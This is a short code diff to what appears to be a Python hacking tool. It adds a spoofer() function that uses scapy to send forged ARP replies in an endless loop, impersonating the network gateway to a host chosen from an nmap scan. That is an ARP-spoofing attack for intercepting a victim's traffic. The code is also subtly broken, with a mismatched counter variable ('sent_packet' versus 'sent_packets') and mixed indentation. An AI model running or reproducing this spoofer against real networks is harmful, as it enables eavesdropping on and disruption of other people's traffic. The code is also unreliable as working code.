@@ -1,7 +1,10 @@
+import sys
+import time
 from netaddr import IPAddress
 import os
 import socket
-import scapy
+#from scapy.all import ARP
+import scapy.all as scapy
 import netifaces
 import nmap
 
@@ -48,8 +51,17 @@ def printHosts(hosts):
 
 
 def spoofer(choice):
-	target = 0
 
+	target = netHosts[int(choice)]
+	print(target)
+	sent_packet = 0
+	while True:
+		packet = scapy.ARP(op=2, pdst=target['ip'], hwdst=target['mac'], psrc=gateway)
+		scapy.send(packet, verbose=False, inter=20, loop=1)
+		print("\r[+] Sent packets: " + str(sent_packets)),
+            # only flush the UI for the bit not wrapped in \r
+		sys.stdout.flush()
+		time.sleep(2)
 
 
 
